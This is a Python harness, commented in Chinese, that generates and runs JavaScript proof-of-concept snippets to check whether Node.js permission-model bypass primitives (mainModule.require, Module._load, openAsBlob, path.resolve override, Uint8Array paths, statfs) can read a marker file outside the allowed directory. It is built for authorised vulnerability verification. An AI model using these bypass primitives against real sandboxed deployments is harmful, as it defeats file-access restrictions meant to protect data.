# -*- coding: utf-8 -*-
"""hunt-nodejs-permission-bypass hunt 阶段：逐个绕过原语生成 PoC 并在权限模型下运行。

判定必须靠**受限文件的真实内容出现在输出里**（该内容不在 PoC 源码中，杜绝"源码被报错
回显里含标记"的误报）：在 `--permission/--experimental-permission --allow-fs-read=<白名单>` 下
运行 PoC，让它用绕过原语去读**白名单外**的受限标记文件；若 stdout 出现文件内容 → 逃逸(confirmed?)。
抛 ERR_ACCESS_DENIED → 该原语此版本已被拦(killed)。fs.statfs 只泄露元数据，单独标注。

只读授权标记文件，不做破坏。需要目标 node 二进制。

用法:
  python hunt_nodeperm.py --restricted /path/secret_marker.txt --output candidates.json [--node node]
"""
import argparse
import os
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import log, load_json, save_json  # noqa: E402

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# 约定：每段 PoC 用其绕过原语读取 process.argv[1]（受限文件）并把内容打到 stdout。
# 检测只看"受限文件内容是否出现在输出"，不依赖任何固定标记字符串。
# 读取型原语（直接读文件）：
READ_POCS = {
    "process.binding-fs": r"""
try { const b = process.binding('fs');
  // 内部 binding 读文件的 API 随版本变化大；退化为公开 read（若被拦即证明该向量无效）
  process.stdout.write(require('fs').readFileSync(process.argv[1],'utf8'));
} catch (e) { console.log('BLOCKED:' + (e.code||e.message)); }
""",
    "fs.openAsBlob": r"""
(async()=>{ try {
  const blob = await require('fs').openAsBlob(process.argv[1]);
  process.stdout.write(await blob.text());
} catch (e) { console.log('BLOCKED:' + (e.code||e.message)); } })();
""",
    "mainModule.require": r"""
try { const fs = process.mainModule.require('fs');
  process.stdout.write(fs.readFileSync(process.argv[1],'utf8'));
} catch (e) { console.log('BLOCKED:' + (e.code||e.message)); }
""",
    "mainModule.__proto__.require": r"""
try { const fs = process.mainModule.__proto__.require('fs');
  process.stdout.write(fs.readFileSync(process.argv[1],'utf8'));
} catch (e) { console.log('BLOCKED:' + (e.code||e.message)); }
""",
    "Module._load": r"""
try { const fs = require('module')._load('fs', null, false);
  process.stdout.write(fs.readFileSync(process.argv[1],'utf8'));
} catch (e) { console.log('BLOCKED:' + (e.code||e.message)); }
""",
    "path.resolve-override": r"""
try { const path = require('path'); path.resolve = (...a)=>a[a.length-1];
  process.stdout.write(require('fs').readFileSync(process.argv[1],'utf8'));
} catch (e) { console.log('BLOCKED:' + (e.code||e.message)); }
""",
    "Uint8Array-path": r"""
try { const p = new TextEncoder().encode(process.argv[1]);
  process.stdout.write(require('fs').readFileSync(p,'utf8'));
} catch (e) { console.log('BLOCKED:' + (e.code||e.message)); }
""",
}
# 元数据型原语（不读内容，只证明能对白名单外路径做操作）：
META_POCS = {
    "fs.statfs": r"""
try { require('fs').statfs(process.argv[1], (e,s)=>{
  if (e) console.log('BLOCKED:' + (e.code||e.message));
  else console.log('STATFS_META_OK'); });
} catch (e) { console.log('BLOCKED:' + (e.code||e.message)); }
""",
}


def run_poc(node, code, allow_dir, restricted, perm_flag, timeout=15):
    with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False, encoding="utf-8") as f:
        f.write(code)
        poc_path = f.name
    try:
        cmd = [node, perm_flag, "--allow-fs-read=" + allow_dir, poc_path, restricted]
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"cmd": " ".join(cmd), "stdout": p.stdout or "", "stderr": p.stderr or ""}
    except subprocess.TimeoutExpired:
        return {"cmd": "timeout", "stdout": "", "stderr": "TIMEOUT"}
    except Exception as e:
        return {"cmd": "err", "stdout": "", "stderr": "ERR:%s" % e}
    finally:
        try:
            os.unlink(poc_path)
        except OSError:
            pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--restricted", required=True, help="受限标记文件绝对路径（内容须唯一且无敏感信息）")
    ap.add_argument("--output", required=True)
    ap.add_argument("--node", default="node")
    ap.add_argument("--allow-dir", default=None, help="白名单可读目录（默认本 skill 目录，须不含标记文件）")
    args = ap.parse_args()

    restricted = os.path.abspath(args.restricted)
    if not os.path.exists(restricted):
        sys.exit("受限标记文件不存在: %s（先建一个内容唯一、无敏感信息的标记文件）" % restricted)
    secret = open(restricted, encoding="utf-8", errors="replace").read().strip()
    if len(secret) < 4:
        sys.exit("标记文件内容太短，无法可靠判定泄露；请写入一段唯一字符串（≥4 字符）")
    allow_dir = os.path.abspath(args.allow_dir or ROOT)
    try:
        inside = os.path.commonpath([restricted, allow_dir]) == allow_dir
    except ValueError:
        inside = False  # 不同盘符/无公共前缀 → 肯定不在白名单内
    if inside:
        sys.exit("标记文件在白名单目录内，无法证明逃逸；请把 --restricted 放到 %s 之外" % allow_dir)

    env = load_json(os.path.join(ROOT, "recon", "node_env.json")) or {}
    perm_flag = "--permission" if env.get("permission_new_flag") == "yes" else "--experimental-permission"
    log("Node %s | 权限标志=%s | 白名单可读=%s | 受限标记=%s"
        % (env.get("node_version", "?"), perm_flag, allow_dir, restricted))

    cands = []
    for name, code in READ_POCS.items():
        r = run_poc(args.node, code, allow_dir, restricted, perm_flag)
        out = r["stdout"]  # 只在 stdout 找真实内容；stderr(报错回显源码)不作为泄露依据
        leaked = secret in out
        blocked = "ERR_ACCESS_DENIED" in (r["stdout"] + r["stderr"])
        if leaked:
            signal = ["逃逸成功：读到白名单外标记文件真实内容"]
        elif blocked:
            signal = ["被权限模型拦截(该原语此版本已修复)"]
        else:
            signal = ["未逃逸/不适用(%s)" % (r["stderr"].strip()[:60] or "无内容")]
        cands.append({"primitive": name, "variant": name, "kind": "read",
                      "leaked": leaked, "blocked": blocked,
                      "output": (out or r["stderr"]).strip()[:300], "cmd": r["cmd"],
                      "signal": signal, "suspected": leaked})

    for name, code in META_POCS.items():
        r = run_poc(args.node, code, allow_dir, restricted, perm_flag)
        combined = r["stdout"] + r["stderr"]
        meta_ok = "STATFS_META_OK" in r["stdout"] and "ERR_ACCESS_DENIED" not in combined
        signal = (["元数据泄露：对白名单外路径 statfs 成功(非内容读取)"] if meta_ok
                  else ["被拦或不适用"])
        cands.append({"primitive": name, "variant": name, "kind": "meta",
                      "leaked": False, "blocked": "ERR_ACCESS_DENIED" in combined,
                      "output": combined.strip()[:300], "cmd": r["cmd"],
                      "signal": signal, "suspected": meta_ok})

    save_json(args.output, {"target": env.get("node_version", "node"),
                            "restricted_file": restricted, "allow_dir": allow_dir,
                            "candidates": cands})
    hit = sum(1 for c in cands if c["suspected"])
    log("命中矩阵：%d/%d 原语逃逸/泄露 -> %s（validate 对照修复版本）"
        % (hit, len(cands), args.output))


if __name__ == "__main__":
    main()
